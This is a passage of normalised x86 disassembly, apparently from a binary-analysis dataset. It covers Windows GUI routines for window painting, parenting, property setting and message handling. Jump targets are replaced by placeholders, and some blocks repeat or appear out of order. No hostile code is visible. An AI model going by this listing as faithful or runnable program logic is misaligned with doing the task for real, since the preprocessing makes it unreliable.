je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418550
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418550
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44a394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_447c44
mov eax [ ebp - 0x8 ]
push eax
push sub_44a21c
mov eax [ ebp - 0x8 ]
push eax
push sub_44a254
push ebp
call sub_44a2bc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a3f0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4466d8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4088cc
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4088e0
mov ecx eax
mov edx edi
mov eax ebx
call sub_4466e8
mov eax r-xdata
call sub_4088ec
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44518c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44a448
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44a495
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a49c
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ca34
sub_44a4ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4185ac
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418550
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44a4f4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44a4ac
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_449d48
call sub_445db8
inc edi
dec esi
jne r-xdata
sub_44a590
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44a5ac
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418550
call sub_44a5ac
inc edi
dec esi
jne r-xdata
sub_44a60c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40346c
mov ebx eax
mov eax edi
call sub_44a5ac
mov eax edi
call sub_44a748
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44a64c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44a722
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44790c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418550
call sub_44a64c
inc esi
dec ebx
jne r-xdata
sub_44a748
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a64c
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44a788
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44a5ac
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44a748
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406c24
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44790c
jmp r-xdata
sub_44a810
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a868
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44a857
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a85e
call sub_44518c
call sub_426454
retn
sub_44a888
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416eec
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406c0c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44790c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44a940
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_418550
call sub_44a888
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418550
call sub_44a888
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44a9d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d054
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406bf8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44a940
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406c0c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44790c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44aa68
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_446ec8
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_4479d8
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44a9d4
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406bf8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4462a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44a940
test eax eax
je r-xdata
mov eax ebx
call sub_45e10c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4479d8
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44d054
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44d054
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44790c
sub_44abcc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_447b6c
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44790c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_4240dc
call sub_423458
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424118
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_446304
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44acd4
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_443644
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44790c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44ad08
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44ae28
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ae60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae2f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418550
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44ae60
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4185ac
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418550
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416f14
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418550
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423458
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416f14
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423458
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416f14
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4450a0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44790c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44b090
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4450a0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44790c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44790c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4450a0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44b090
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418550
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44b1e4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44ad08
jmp r-xdata
mov eax ebx
call sub_449d84
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b336
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44d054
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44790c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44b1e4
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_44d054
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44b344
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b364
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b3d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b3f8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b418
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b43c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44acd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44b460
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44acd4
test al al
